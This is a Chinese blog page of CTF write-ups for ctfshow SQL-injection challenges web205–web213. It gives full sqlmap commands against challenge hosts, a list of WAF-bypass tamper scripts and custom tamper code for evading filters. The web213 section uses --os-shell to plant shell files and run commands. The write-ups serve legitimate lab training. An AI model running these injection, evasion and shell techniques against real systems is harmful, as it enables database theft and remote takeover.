+<h1 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h1><h3 id="api鉴权-–safe-url-–safe-freq"><a href="#api鉴权-–safe-url-–safe-freq" class="headerlink" title="api鉴权 –safe-url –safe-freq"></a>api鉴权 –safe-url –safe-freq</h3><p>每次查询请求可以注意到都会访问目标网页：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689169274466-380ecb13-009d-4bdd-a657-ee7081adc43b.png" alt="image.png"><br>需要以下两个参数：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">--safe-url 设置在测试目标地址前访问的安全链接
+--safe-freq 设置两次注入测试前访问安全链接的次数</code></pre>
+<p>payload：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;0a640dc6-69ff-4520-8def-d404e2db36dd.challenge.ctf.show:8080&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;0a640dc6-69ff-4520-8def-d404e2db36dd.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flax -C flagx,id,tes --dump --batch</code></pre>
+<h1 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h1><h3 id="–level-5"><a href="#–level-5" class="headerlink" title="–level&#x3D;5"></a>–level&#x3D;5</h3><p>提示说sql需要闭合，<br>打不出来可以使用更高的LEVEL调用更多的payload。<br>其实都不用提高等级，sqlmap低level就可以：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;9437af85-a95a-488f-9e17-c3f716c65456.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;9437af85-a95a-488f-9e17-c3f716c65456.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxc -C flagv --dump --batch</code></pre>
+<h1 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h1><h3 id="tamper的编写-常见tamper脚本"><a href="#tamper的编写-常见tamper脚本" class="headerlink" title="tamper的编写 常见tamper脚本"></a>tamper的编写 常见tamper脚本</h3><p>首先看过滤：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">&#x2F;&#x2F;对传入的参数进行了过滤
+  function waf($str)&#123;
+   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);
+  &#125;</code></pre>
+<p>常用tamper脚本：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">举例如下tamper脚本：
+
+apostrophemask.py 用utf8代替引号
+
+equaltolike.py MSSQL * SQLite中like 代替等号
+
+greatest.py MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号
+
+space2hash.py 空格替换为#号 随机字符串 以及换行符 
+
+space2comment.py 用&#x2F;**&#x2F;代替空格
+
+apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号
+
+halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论
+
+space2morehash.py MySQL中空格替换为 #号 以及更多随机字符串 换行符
+
+appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码
+
+ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤
+
+space2mssqlblank.py mssql空格替换为其它空符号
+
+base64encode.py 用base64编码
+
+space2mssqlhash.py mssql查询中替换空格
+
+modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释
+
+space2mysqlblank.py mysql中空格替换其它空白符号
+
+between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）
+
+space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）
+
+multiplespaces.py 围绕SQL关键字添加多个空格
+
+space2plus.py 用+替换空格
+
+bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为like
+
+nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代
+
+space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集
+
+sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾
+
+chardoubleencode.py 双url编码(不处理以编码的)
+
+unionalltounion.py 替换UNION ALL SELECT UNION SELECT
+
+charencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；
+
+randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写
+
+unmagicquotes.py 宽字符绕过 GPC addslashes
+
+randomcomments.py 用&#x2F;**&#x2F;分割sql关键字
+
+charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码
+
+securesphere.py 追加特制的字符串
+
+versionedmorekeywords.py MySQL &gt;&#x3D; 5.1.13注释绕过
+
+halfversionedmorekeywords.py MySQL &lt; 5.1中关键字前加注释
+
+space2comment.py替换空格字符串(‘‘) 使用注释‘&#x2F;**&#x2F;’</code></pre>
+<p>比如说这里过滤了空格，就可以使用space2comment.py文件<br>payload：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;1418c415-d521-4839-b163-39778bb6d088.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;1418c415-d521-4839-b163-39778bb6d088.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment --batch -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</code></pre>
+<h2 id="如何写自己的tamper脚本"><a href="#如何写自己的tamper脚本" class="headerlink" title="如何写自己的tamper脚本"></a>如何写自己的tamper脚本</h2><p><a target="_blank" rel="noopener" href="https://www.wlhhlc.top/posts/14827">https://www.wlhhlc.top/posts/14827</a> 参考这个佬学会的<br>我们打开space2comment.py 修改（文件在<code>/usr/share/sqlmap/tamper</code>下）<br>我们编辑脚本，并将其中的<code>/**/</code>修改为 <code>%09</code>来做到绕过空格。<br>新建一个space2comment2.py 然后将修改后的脚本粘贴进去：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">#!&#x2F;usr&#x2F;bin&#x2F;env python
+
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+
+__priority__ &#x3D; PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+
+    retVal &#x3D; payload
+
+    if payload:
+        retVal &#x3D; &quot;&quot;
+        quote, doublequote, firstspace &#x3D; False, False, False
+
+        for i in xrange(len(payload)):
+            if not firstspace:
+                if payload[i].isspace():
+                    firstspace &#x3D; True
+                    retVal +&#x3D; chr(0x9)
+                    continue
+
+            elif payload[i] &#x3D;&#x3D; &#39;\&#39;&#39;:
+                quote &#x3D; not quote
+
+            elif payload[i] &#x3D;&#x3D; &#39;&quot;&#39;:
+                doublequote &#x3D; not doublequote
+
+            elif payload[i] &#x3D;&#x3D; &quot; &quot; and not doublequote and not quote:
+                retVal +&#x3D; chr(0x9)
+                continue
+
+            retVal +&#x3D; payload[i]
+
+    return retVal</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689171350412-cce3a4a4-a1d3-4275-9381-4b8988fe4572.png" alt="image.png"><br>然后就可以运行自己的tamper了。</p>
+<h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><pre class="language-bash" data-language="bash"><code class="language-bash">&#x2F;&#x2F;对传入的参数进行了过滤
+&#x2F;&#x2F; $id &#x3D; str_replace(&#39;select&#39;, &#39;&#39;, $id);
+  function waf($str)&#123;
+   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);
+  &#125;</code></pre>
+<p>过滤了select，但是是小写，sqlmap是可以用大写的绕过的。因此还用上题目的脚本即可：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment2 --batch -D ctfshow_web -T ctfshow_flaxcac -C flagvca --d
+ump</code></pre>
+<p>注意我这里使用的上道题编写的<code>space2comment**2**</code>而不是<code>space2comment</code>当然用后者也可以。</p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>有时候可以直接无差别爆破，比如知道库就直接跳到dump，sqlmap会自己挖出所有的串</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u http:&#x2F;&#x2F;5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;5f11ab84-6c10-4ae8-91e7-54016a12413c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment2 --batch -D ctfshow_web --dump</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689171787437-65fd338d-a17a-4aa1-b36f-d7a463cb3675.png" alt="image.png"></p>
+<h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><h3 id="自定义tamper"><a href="#自定义tamper" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><pre class="language-bash" data-language="bash"><code class="language-bash">function waf($str)&#123;
+ &#x2F;&#x2F;TODO 未完工
+ return preg_match(&#39;&#x2F; |\*|\&#x3D;&#x2F;&#39;, $str);
+&#125;</code></pre>
+<p>过滤空格 * &#x3D;<br>等号可以用<code>like</code>代替<br>简便一下脚本如图：</p>
+<pre class="language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python
+
+
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+
+__priority__ &#x3D; PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+
+
+    retVal &#x3D; payload
+    retVal &#x3D; retVal.replace(&quot;&#x3D;&quot;, &quot; like &quot;)
+    retVal &#x3D; retVal.replace(&quot; &quot;, chr(0x09))
+
+
+    return retVal</code></pre>
+<p>我保存在了tamper目录下的ctfshow209.py文件<br>payload运行即可：</p>
+<pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;cbbe7a5a-da99-494c-b921-3167867de00b.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;cbbe7a5a-da99-494c-b921-3167867de00b.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshow209 --batch -D ctfshow_web --dump</code></pre>
+<h2 id="By-the-way"><a href="#By-the-way" class="headerlink" title="By the way"></a>By the way</h2><p>做了这么多，payload其实不太好换，来个正则直接在emeditor里面直接替换了。<br>正则如下：</p>
+<pre class="language-python" data-language="python"><code class="language-python">http:&#x2F;&#x2F;[a-zA-Z0-9\-\.]+&#x2F;</code></pre>
+<p>正则有机会一定要学一下。</p>
+<h1 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h1><h3 id="自定义tamper-1"><a href="#自定义tamper-1" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><pre class="language-python" data-language="python"><code class="language-python">function decode($id)&#123;
+    return strrev(base64_decode(strrev(base64_decode($id))));
+  &#125;</code></pre>
+<p>它的作用是对一个经过两次base64编码的字符串进行解码和反转操作。<br>具体分析如下：</p>
+<ol>
+<li>base64_decode($id)：此部分代码表示对一个变量 $id 进行base64解码操作。在Python中，可以使用 base64.b64decode() 函数来实现。</li>
+<li>strrev(base64_decode($id))：此部分代码表示对上一步中解码后的结果进行字符串反转操作。在Python中，可以使用字符串切片来实现，即将字符串反向取值，例如 string[::-1]。</li>
+<li>base64_decode(strrev(base64_decode($id)))：此部分代码表示对前一步的反转结果再次进行base64解码。</li>
+<li>strrev(base64_decode(strrev(base64_decode($id))))：最后一步将前一步解码后的结果再次进行字符串反转操作，得到最终的解码结果。</li>
+</ol>
+<p>把解密过程反过来即可。<br>我们可以有两种解法第一种wp中写法：</p>
+<pre class="language-python" data-language="python"><code class="language-python">from base64 import *
+retVal &#x3D; retVal.replace(&quot;-- -&quot;, &quot;#&quot;)
+retVal &#x3D; b64encode(&quot;&quot;.join(reversed(b64encode(&quot;&quot;.join(reversed(retVal)).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;))).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)
+print(retVal)</code></pre>
+<p>第二种就是：</p>
+<pre class="language-python" data-language="python"><code class="language-python">import base64
+reversed_string1 &#x3D; retVal[::-1]
+encoded_string1 &#x3D; base64.b64encode(reversed_string1.encode()).decode()
+reversed_string2 &#x3D; encoded_string1[::-1]
+encrypted_string &#x3D; base64.b64encode(reversed_string2.encode()).decode()
+print(encrypted_string)</code></pre>
+<p>其中第二种<code>[::-1]</code>是Python中字符串切片（slice）的一种用法，它表示将字符串反向取值。<br>脚本以第一种为例：</p>
+<pre class="language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python
+
+&quot;&quot;&quot;
+Copyright (c) 2006-2022 sqlmap developers (https:&#x2F;&#x2F;sqlmap.org&#x2F;)
+See the file &#39;LICENSE&#39; for copying permission
+&quot;&quot;&quot;
+
+from lib.core.compat import xrange
+from lib.core.enums import PRIORITY
+from base64 import *
+
+__priority__ &#x3D; PRIORITY.LOW
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+
+
+    retVal &#x3D; payload
+    retVal &#x3D; retVal.replace(&quot;-- -&quot;, &quot;#&quot;)
+    retVal &#x3D; b64encode(&quot;&quot;.join(reversed(b64encode(&quot;&quot;.join(reversed(retVal)).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;))).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)
+
+    return retVal
+</code></pre>
+<p>payload：</p>
+<pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;63c468c1-0392-4832-87ce-7fe0b3345449.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;63c468c1-0392-4832-87ce-7fe0b3345449.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshow210 --batch -D ctfshow_web --dump</code></pre>
+<h2 id="python中的-1"><a href="#python中的-1" class="headerlink" title="python中的[::-1]"></a>python中的[::-1]</h2><p>在Python中，[start:stop:step] 是用来截取或提取字符串（或列表等可迭代对象）的一种方法。当省略 start 和 stop 参数时，它会默认使用整个字符串。而 step 参数表示步长，控制取值的方向和间隔。<br>当 step 参数为负数时，即 [::-1]，它表示从字符串的末尾开始，以倒序的方式取值，步长为1。换句话说，它实现了将字符串反转的效果。<br>下面是一个例子来说明该用法：</p>
+<pre class="language-none"><code class="language-none">python
+复制代码
+string &#x3D; &quot;Hello, World!&quot;
+reversed_string &#x3D; string[::-1]
+print(reversed_string)</code></pre>
+<p>输出结果为：</p>
+<pre class="language-none"><code class="language-none">复制代码
+!dlroW ,olleH</code></pre>
+<h1 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h1><h3 id="自定义tamper-2"><a href="#自定义tamper-2" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><p>加了一个空格过滤，修改一下脚本即可。<br>在脚本操作中加一行：</p>
+<pre class="language-python" data-language="python"><code class="language-python">retVal &#x3D; retVal.replace(&quot; &quot;, chr(0x0a))</code></pre>
+<p>即可。<br>payload不变：</p>
+<pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;0e8324af-9ca2-4ec5-b9ce-0d6856a8528a.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;0e8324af-9ca2-4ec5-b9ce-0d6856a8528a.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshow210 --batch -D ctfshow_web --dump</code></pre>
+<h1 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h1><h3 id="自定义tamper-3"><a href="#自定义tamper-3" class="headerlink" title="自定义tamper"></a>自定义tamper</h3><pre class="language-python" data-language="python"><code class="language-python">&#x2F;&#x2F;对查询字符进行解密
+  function decode($id)&#123;
+    return strrev(base64_decode(strrev(base64_decode($id))));
+  &#125;
+function waf($str)&#123;
+    return preg_match(&#39;&#x2F; |\*&#x2F;&#39;, $str);
+&#125;</code></pre>
+<p>加了个星号，无关痛痒，还用上一题的即可。<br>payload：</p>
+<pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;29fa0dfe-7f52-4f70-83e9-2795e92dcb6b.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;29fa0dfe-7f52-4f70-83e9-2795e92dcb6b.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;ctfshow210 --batch -D ctfshow_web --dump</code></pre>
+<h1 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h1><h3 id="–os-shell-一键getshell"><a href="#–os-shell-一键getshell" class="headerlink" title="–os-shell 一键getshell"></a>–os-shell 一键getshell</h3><pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;97a2ce63-a000-4020-838b-9eccc076d657.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;97a2ce63-a000-4020-838b-9eccc076d657.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1  --tamper&#x3D;ctfshow210.py --os-shell</code></pre>
+<h2 id="什么是–os-shell"><a href="#什么是–os-shell" class="headerlink" title="什么是–os-shell"></a>什么是–os-shell</h2><p>–os-shell 其本质是写入两个shell文件，其中一个可以命令执行，另一个则是可以让我们上传文件；<br>不过也是有限制的，上传文件我们需要受到两个条件的限制，一个是网站的绝对路径，另一个则是导入导出的权限</p>
+<p>在mysql中，由 secure_file_priv 参数来控制导入导出权限，该参数后面为null时，则表示不允许导入导出；如果是一个文件夹，则表示仅能在这个文件夹中导入导出；如果参数后面为空，也就是没有值时，则表示在任何文件夹都能导入导出<br>payload：</p>
+<pre class="language-python" data-language="python"><code class="language-python">sqlmap -u http:&#x2F;&#x2F;899832c9-8556-49fb-8f82-2b4156bed9bf.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;899832c9-8556-49fb-8f82-2b4156bed9bf.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1  --tamper&#x3D;ctfshow210 --batch --level&#x3D;5 --os-shell</code></pre>
+<p>然后就会出现shell页面：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689175482915-61978078-d777-4dbe-820b-ad1b742325f8.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689175522091-1b21cb86-9dfb-4896-8dca-fdd1bf8d1d85.png" alt="image.png"><br>执行完输入q退出即可</p>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/d18ef46e/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>使用Python</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/65bd4621/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>web171-web190SQL注入篇</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
